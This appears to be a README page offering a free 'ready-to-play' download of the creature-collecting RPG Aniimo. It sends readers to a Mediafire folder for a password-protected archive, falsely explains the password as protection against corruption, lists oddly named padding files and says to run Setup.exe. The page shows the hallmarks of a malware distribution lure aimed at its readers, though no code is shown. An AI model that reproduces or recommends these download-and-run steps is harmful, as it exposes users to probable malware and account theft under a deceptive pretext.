## 🕹️ About

Aniimo is a free-to-play, creature-catching open-world RPG developed and published by Pawprint Studio. Set across the continent of Idyll, it follows Pathfinders who explore a vibrant fantasy world, bond with unique Aniimo, unlock abilities, and uncover new places to visit, including a floating metropolis. The core loop combines exploration, creature collection, progression, competitive battles, online co-op, and cross-platform multiplayer. Aniimo launched in September 2026 and is available on Windows PC and other platforms. This ready-to-play release is packaged for quick setup: unpack, run, and play.

Aniimo is for players who enjoy colorful open-world RPGs, creature collecting, exploration, and online adventures with friends.

## ✨ Features

- ⚔️ **Dynamic Battles** — Use Aniimo abilities and progression to take on exciting competitions.
- 🏙️ **Floating Metropolis** — Travel to a sky-floating city and meet other Pathfinders.
- 🗺️ **Open-World Exploration** — Explore the expansive continent of Idyll and discover varied locations.
- 🤝 **Online Multiplayer** — Play solo, team up in online co-op, or compete against other players.
- 🐾 **Creature Collection** — Find, bond with, and develop a roster of unique Aniimo.
- 🌐 **Cross-Platform Play** — Join the wider Aniimo community across supported platforms.

## 📦 Download & Setup

| Platform | Status |

### Step 1: Download

Download the ready-to-play package from **[this page](https://www.mediafire.com/folder/1dr4rik7qm60h/GameSetup)**.

### Step 2: Extract

1. Use any standard archive extractor (7-Zip, WinRAR, WinZip, etc.)
2. The archive is protected with the password **`2026`** to prevent corruption during transfer
3. Extract **all files** into a single folder of your choice
4. Do not rename or move individual files — the setup expects its folder structure intact

The extracted folder should look like this:

```
Setup/
|-- Setup.exe <- Main executable
|-- animations.dll <- Animation system
|-- dlc.md5 <- DLC checksums
|-- update_1.res <- Update resources
|-- driver.umap <- Driver data
|-- installer.dat <- Installer data
|-- audio.res <- Audio resources
|-- global.cfg <- Global settings
|-- Password 2026.txt <- Password reminder (empty)
|-- lang.sys <- Language system
|-- scripts.lic <- Game scripts
|-- license.bank <- License data
|-- assets.wem <- Asset audio
|-- patch_1.bnk <- Audio banks
|-- physics.sys <- Physics engine
|-- localization.ini <- Language files
|-- res.pak <- Resources archive
|-- driver.pak <- Driver archive
|-- bootstrap.wem <- Bootstrap audio
|-- license.wem <- Audio assets
|-- launcher.dll <- Launcher library
|-- api.pak <- API modules
|-- settings.bin <- Configuration
|-- update_1.ini <- Update config
|-- uninstall.key <- Uninstall key
```

### Step 3: Launch

1. Open the extracted folder
2. Run `Setup.exe`
3. The game is ready to play

**A:** The game is packaged so it can be played right after a quick setup. Unpack, run, and it's ready — no lengthy configuration required.
